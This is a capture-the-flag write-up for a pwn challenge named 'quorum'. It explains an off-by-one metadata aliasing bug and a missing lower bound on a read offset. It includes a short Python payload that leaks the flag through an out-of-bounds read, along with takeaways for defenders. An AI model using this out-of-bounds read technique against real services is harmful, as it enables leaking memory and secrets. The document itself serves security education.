# quorum

**Category:** pwn · **Points:** 494 · **Solves:** 2 · **Flag:** `isfcr{d4t4_0nly_c0rrupt_th3_0p3r4nds_n0t_th3_fl0w}`

## Challenge

> A weighted ballot that tallies a little more than it is handed.

Authored by NotKnox. No attachments — black-box only, over `nc 0.cloud.chals.io <port>`.
The service exposes two commands:

- `set <i> <hex>` — store raw bytes into ballot `i`
- `show <i>` — display ballot `i`

## Initial Analysis

Probing the layout shows each ballot occupies **64 bytes**:

```text
+0x00  data[48]        # the ballot contents
+0x30  offset (u64)    # where show starts reading
+0x38  length (u64)    # how many bytes show returns
```

So the trailing 16 bytes of the 48-byte write spill into an `offset`/`length`
pair that `show` uses to render the ballot. The "tallies a little more than it
is handed" hint maps directly onto this: the display reads using attacker-set
offset and length.

## Vulnerability / Core Concept

Two bugs stack here:

1. **Off-by-one index aliasing.** `show 7` renders ballot 7's *data* but uses the
   `offset`/`length` that were stored by `set 6`. You can confirm this by setting
   offset values of 0, 1, and 8 on ballot 6 and watching the bytes returned by
   `show 7` shift by exactly those amounts.
2. **Signed/unbounded offset — no lower bound.** The read offset is taken as a
   64-bit value with no lower-bound check, so a two's-complement "negative"
   offset makes the read walk *backwards* in memory from the ballot.

The flag already lives in memory shortly before ballot 7. Setting the offset to
`UINT64_MAX - 0x20f` (i.e. `-0x210`) rewinds the read `0x210` bytes to land on
the flag; a `length` of `0x60` is enough to capture the whole thing. This is
purely a **data-only** read primitive — we never corrupt control flow, exactly
as the flag text jokes.

## Exploitation

The full exploit is `solve.py`. The core is constructing a 64-byte payload whose
data region is padding and whose tail sets `offset = -0x210` and `length = 0x60`,
writing it to ballot 6, then reading ballot 7:

```python
payload = (
    b"\x00" * 48
    + struct.pack("<Q", (-0x210) & 0xFFFFFFFFFFFFFFFF)  # offset: rewind 0x210
    + struct.pack("<Q", 0x60)                            # length: 0x60 bytes
)
sock.sendall(b"set 6 " + payload.hex().encode() + b"\n")
sock.sendall(b"show 7\n")
# then regex the response for isfcr{...}
```

Run it:

```console
$ python3 solve.py 0.cloud.chals.io 24907
isfcr{d4t4_0nly_c0rrupt_th3_0p3r4nds_n0t_th3_fl0w}
```

## Flag

```
isfcr{d4t4_0nly_c0rrupt_th3_0p3r4nds_n0t_th3_fl0w}
```

## Key Takeaways

- Fixed-size records with a user-controlled `offset`/`length` are a classic
  out-of-bounds-read pattern — especially when the length write overruns into
  adjacent metadata fields.
- A missing *lower* bound is just as exploitable as a missing upper bound: a
  negative (wrapped) offset reads *behind* the buffer, which is often where
  juicy data sits.
- The `show 7` / `set 6` aliasing is an off-by-one index bug — worth checking
  that an index used for data matches the index used for its metadata.
